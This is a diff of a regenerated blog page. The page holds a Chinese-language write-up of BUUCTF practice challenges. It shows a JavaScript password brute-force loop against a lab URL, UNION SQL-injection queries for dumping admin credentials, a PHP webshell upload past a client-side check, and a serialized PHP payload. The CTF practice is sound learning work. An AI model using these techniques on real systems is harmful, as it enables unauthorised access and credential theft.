@@ -17,7 +17,12 @@
 
 
 <meta name="author" content="bigshans" />
-<meta name="description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &amp;lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&amp;#39;file&amp;#39;]))" /><meta name="keywords" content="Hugo, theme, even" />
+<meta name="description" content="娱乐性质，玩一玩。
+Linux Lab 使用 ssh 连接到靶机即可。
+ssh root@address -p port flag.txt 就放在根目录下面。
+BUUCFT 打开页面，首先给了一段代码。
+&lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;])) { $str = $_GET[&#39;file&#39;]; include $_GET[&#39;file&#39;]; } 这里的意思是，高亮当前文件，判断是否存在为 file 的 query 参数，如果存在，就加载它。
+" /><meta name="keywords" content="Hugo, theme, even" />
 
 
 
@@ -26,7 +31,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.112.0-DEV with theme even" />
+<meta name="generator" content="Hugo 0.143.0 with theme even" />
 
 
 <link rel="canonical" href="https://bigshans.github.io/post/buucft/" />
@@ -46,19 +51,39 @@
 
 
 
-<meta property="og:title" content="BUUCFT 题解" />
-<meta property="og:description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bigshans.github.io/post/buucft/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2023-07-23T08:19:53+08:00" />
-<meta property="article:modified_time" content="2023-07-23T08:19:53+08:00" />
-<meta itemprop="name" content="BUUCFT 题解">
-<meta itemprop="description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))"><meta itemprop="datePublished" content="2023-07-23T08:19:53+08:00" />
-<meta itemprop="dateModified" content="2023-07-23T08:19:53+08:00" />
-<meta itemprop="wordCount" content="1121">
-<meta itemprop="keywords" content="BUUCFT,题解," /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="BUUCFT 题解"/>
-<meta name="twitter:description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))"/>
+<meta property="og:url" content="https://bigshans.github.io/post/buucft/">
+  <meta property="og:site_name" content="Bigshans&#39; Blog">
+  <meta property="og:title" content="BUUCFT 题解">
+  <meta property="og:description" content="娱乐性质，玩一玩。
+Linux Lab 使用 ssh 连接到靶机即可。
+ssh root@address -p port flag.txt 就放在根目录下面。
+BUUCFT 打开页面，首先给了一段代码。
+&lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;])) { $str = $_GET[&#39;file&#39;]; include $_GET[&#39;file&#39;]; } 这里的意思是，高亮当前文件，判断是否存在为 file 的 query 参数，如果存在，就加载它。">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2023-07-23T08:19:53+08:00">
+    <meta property="article:modified_time" content="2023-07-23T08:19:53+08:00">
+    <meta property="article:tag" content="BUUCFT">
+    <meta property="article:tag" content="题解">
+
+  <meta itemprop="name" content="BUUCFT 题解">
+  <meta itemprop="description" content="娱乐性质，玩一玩。
+Linux Lab 使用 ssh 连接到靶机即可。
+ssh root@address -p port flag.txt 就放在根目录下面。
+BUUCFT 打开页面，首先给了一段代码。
+&lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;])) { $str = $_GET[&#39;file&#39;]; include $_GET[&#39;file&#39;]; } 这里的意思是，高亮当前文件，判断是否存在为 file 的 query 参数，如果存在，就加载它。">
+  <meta itemprop="datePublished" content="2023-07-23T08:19:53+08:00">
+  <meta itemprop="dateModified" content="2023-07-23T08:19:53+08:00">
+  <meta itemprop="wordCount" content="1123">
+  <meta itemprop="keywords" content="BUUCFT,题解">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="BUUCFT 题解">
+  <meta name="twitter:description" content="娱乐性质，玩一玩。
+Linux Lab 使用 ssh 连接到靶机即可。
+ssh root@address -p port flag.txt 就放在根目录下面。
+BUUCFT 打开页面，首先给了一段代码。
+&lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;])) { $str = $_GET[&#39;file&#39;]; include $_GET[&#39;file&#39;]; } 这里的意思是，高亮当前文件，判断是否存在为 file 的 query 参数，如果存在，就加载它。">
 
 
 
@@ -188,7 +213,7 @@
         <div class="post-category">
             <a href="/categories/buucft/"> BUUCFT </a>
             </div>
-          <span class="more-meta"> 约 1121 字 </span>
+          <span class="more-meta"> 约 1123 字 </span>
           <span class="more-meta"> 预计阅读 3 分钟 </span>
         
       </div>
@@ -196,39 +221,19 @@
 
     <div class="post-toc" id="post-toc">
   <h2 class="post-toc-title">文章目录</h2>
-  <div class="post-toc-content"><nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#linux-lab">Linux Lab</a></li>
-        <li><a href="#buucft">BUUCFT</a></li>
-        <li><a href="#暴力破解-1">暴力破解 1</a></li>
-        <li><a href="#buu-sql-course-1">BUU SQL COURSE
-1</a></li>
-        <li><a href="#upload-labs-linux-1">Upload-Labs-Linux 1</a>
-          <ul>
-            <li><a href="#pass-1">Pass 1</a></li>
-          </ul>
-        </li>
-        <li><a href="#buu-code-review-1">BUU CODE
-REVIEW 1</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav></div>
+  <div class="post-toc-content"></div>
 </div>
 
     <div class="post-content">
-      
-
-<p>娱乐性质，玩一玩。</p>
+      <p>娱乐性质，玩一玩。</p>
 <h2 id="linux-lab">Linux Lab</h2>
 <p>使用 ssh 连接到靶机即可。</p>
 <pre class="shell"><code>ssh root@address -p port</code></pre>
 <p>flag.txt 就放在根目录下面。</p>
 <h2 id="buucft">BUUCFT</h2>
 <p>打开页面，首先给了一段代码。</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
 <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Created by PhpStorm.</span></span>
 <span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * User: jinzhao</span></span>
@@ -251,11 +256,12 @@ REVIEW 1</a></li>
 <p>首先是一个登录页面，查看了一下 HTML
 代码，很干净，没有任何其他的东西。尝试写了句 SQL
 注入，不行，所以没有注入的口子。</p>
-<p><img src="../img/buuctf_brute_1.png"/></p>
+<p><img src="../img/buuctf_brute_1.png" /></p>
 <p>尝试用户名，是 admin 。尝试密码 1234
 ，结果报密码错误，密码为四位数字。这里就只能写代码遍历所有四位整数了。因为频繁请求会被
 429 ，但慢慢请求又太慢，所以只能遇到一个 429 就等待一下。</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">sleep</span>(time) {</span>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">sleep</span>(time) {</span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">new</span> <span class="bu">Promise</span>((resolve) <span class="kw">=&gt;</span> {</span>
 <span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        <span class="pp">setTimeout</span>(resolve<span class="op">,</span> time)<span class="op">;</span></span>
 <span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span>
@@ -264,13 +270,13 @@ REVIEW 1</a></li>
 <span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>(<span class="kw">async</span> () <span class="kw">=&gt;</span> {</span>
 <span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">1000</span><span class="op">;</span> i <span class="op">&lt;=</span> <span class="dv">9999</span><span class="op">;</span> i<span class="op">++</span>) {</span>
 <span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> result <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(</span>
-<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#34;http://26a432d9-687e-4232-a5ae-68052673cfa1.node4.buuoj.cn:81/?username=admin&amp;password=&#34;</span> <span class="op">+</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;http://26a432d9-687e-4232-a5ae-68052673cfa1.node4.buuoj.cn:81/?username=admin&amp;password=&quot;</span> <span class="op">+</span></span>
 <span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>            i<span class="op">,</span></span>
 <span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        )<span class="op">.</span><span class="fu">then</span>((res) <span class="kw">=&gt;</span> res<span class="op">.</span><span class="fu">text</span>())<span class="op">;</span></span>
 <span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(i)<span class="op">;</span></span>
-<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="op">!</span>result<span class="op">.</span><span class="fu">startsWith</span>(<span class="st">&#34;密码错误&#34;</span>)) {</span>
-<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (result<span class="op">.</span><span class="fu">includes</span>(<span class="st">&#34;429&#34;</span>)) {</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="op">!</span>result<span class="op">.</span><span class="fu">startsWith</span>(<span class="st">&quot;密码错误&quot;</span>)) {</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (result<span class="op">.</span><span class="fu">includes</span>(<span class="st">&quot;429&quot;</span>)) {</span>
 <span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>                <span class="cf">await</span> <span class="fu">sleep</span>(<span class="dv">500</span>)<span class="op">;</span></span>
 <span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>                i<span class="op">--;</span></span>
 <span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>                <span class="cf">continue</span><span class="op">;</span></span>
@@ -290,9 +296,9 @@ REVIEW 1</a></li>
 <code>id=1 order by 1</code> 来一个个往后推，到
 <code>id=1 order by 3</code> 时结果有错，因此，结果字段是两列。</p>
 <p>接下来确定数据库，<code>id=1 union select 1, database()</code> 。</p>
-<p>然后确定数据库内有哪些表，<code>id=1 union select 1, group_concat(table_name) from information.tables where table_schema=&#39;news&#39;</code>
+<p>然后确定数据库内有哪些表，<code>id=1 union select 1, group_concat(table_name) from information.tables where table_schema='news'</code>
 。</p>
-<p>确定有哪些列，<code>id=1 union select 1, group(column_name) from information.columns where table_name=&#39;admin&#39;</code>
+<p>确定有哪些列，<code>id=1 union select 1, group(column_name) from information.columns where table_name='admin'</code>
 。</p>
 <p>最后拿到 admin
 的密码，<code>id=1 union select username,password from admin</code></p>
@@ -310,13 +316,15 @@ table_name=“xxx”</li>
 <p>提示说用了前端 JS 检查。因为本身 form 就可以上传文件，而 JS
 在这里只是起到了检查的作用，我们直接禁用 JS
 即可。当然，我们也可以通过接口请求来绕过，只要不走这个 JS 就行。</p>
-<p>我们需要上传一个 <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">webshell</a>
+<p>我们需要上传一个 <a
+href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">webshell</a>
 ，因为我用的需要上传两个文件，所以就上传了两遍。完成后查看回显地址，找到我们的
 webshell 链接。一旦打开，我们就成功骇入了。</p>
 <p>执行 <code>cat /flag</code> 即可获得 flag 。</p>
 <h2 id="buu-code-review-1">BUU CODE REVIEW 1</h2>
 <p>启动靶机，打开网页看到代码。</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
 <span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
 <span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Created by PhpStorm.</span></span>
 <span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * User: jinzhao</span></span>
@@ -327,14 +335,14 @@ webshell 链接。一旦打开，我们就成功骇入了。</p>
 <span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="fu">highlight_file</span>(<span class="cn">__FILE__</span>)<span class="ot">;</span></span>
 <span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">BUU</span> {</span>
-<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$correct</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
-<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$input</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$correct</span> <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="ot">;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$input</span> <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="ot">;</span></span>
 <span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__destruct</span>() {</span>
 <span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>       <span class="cf">try</span> {</span>
 <span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>           <span class="va">$this</span>-&gt;correct <span class="op">=</span> <span class="fu">base64_encode</span>(<span class="fu">uniqid</span>())<span class="ot">;</span></span>
 <span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>           <span class="cf">if</span>(<span class="va">$this</span>-&gt;correct <span class="op">===</span> <span class="va">$this</span>-&gt;input) {</span>
-<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>               <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="st">&#34;/flag&#34;</span>)<span class="ot">;</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>               <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="st">&quot;/flag&quot;</span>)<span class="ot">;</span></span>
 <span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>           }</span>
 <span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>       } <span class="cf">catch</span> (<span class="bu">Exception</span> <span class="va">$e</span>) {</span>
 <span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>       }</span>
@@ -355,7 +363,8 @@ webshell 链接。一旦打开，我们就成功骇入了。</p>
 <code>240610708</code> 。</p>
 <p>剩下的序列化是，由于 <code>uniqid()</code>
 得出的值以微秒计，所以不能用值生成来做。这里比较巧妙的采用了引用。</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Created by PhpStorm.</span></span>
 <span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * User: jinzhao</span></span>
@@ -364,14 +373,14 @@ webshell 链接。一旦打开，我们就成功骇入了。</p>
 <span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
 <span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">BUU</span> {</span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$correct</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$input</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$correct</span> <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="ot">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$input</span> <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="ot">;</span></span>
 <span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__destruct</span>() {</span>
 <span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>       <span class="cf">try</span> {</span>
 <span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>           <span class="va">$this</span>-&gt;correct <span class="op">=</span> <span class="fu">base64_encode</span>(<span class="fu">uniqid</span>())<span class="ot">;</span></span>
 <span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>           <span class="cf">if</span>(<span class="va">$this</span>-&gt;correct <span class="op">===</span> <span class="va">$this</span>-&gt;input) {</span>
-<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>               <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="st">&#34;/flag&#34;</span>)<span class="ot">;</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>               <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="st">&quot;/flag&quot;</span>)<span class="ot">;</span></span>
 <span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>           }</span>
 <span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>       } <span class="cf">catch</span> (<span class="bu">Exception</span> <span class="va">$e</span>) {</span>
 <span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>       }</span>
@@ -383,10 +392,8 @@ webshell 链接。一旦打开，我们就成功骇入了。</p>
 <span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">serialize</span>(<span class="va">$a</span>)<span class="ot">;</span></span></code></pre></div>
 <p>结果是：</p>
-<pre><code>O:3:&#34;BUU&#34;:2:{s:7:&#34;correct&#34;;s:0:&#34;&#34;;s:5:&#34;input&#34;;R:2;}</code></pre>
+<pre><code>O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</code></pre>
 <p>然后把这些值往 postman 里填就行，记得是 POST 。</p>
-
-
 
     </div>
 
@@ -443,7 +450,7 @@ webshell 链接。一旦打开，我们就成功骇入了。</p>
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/bigshans" class="iconfont icon-github" title="github"></a>
-  <a href="https://bigshans.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
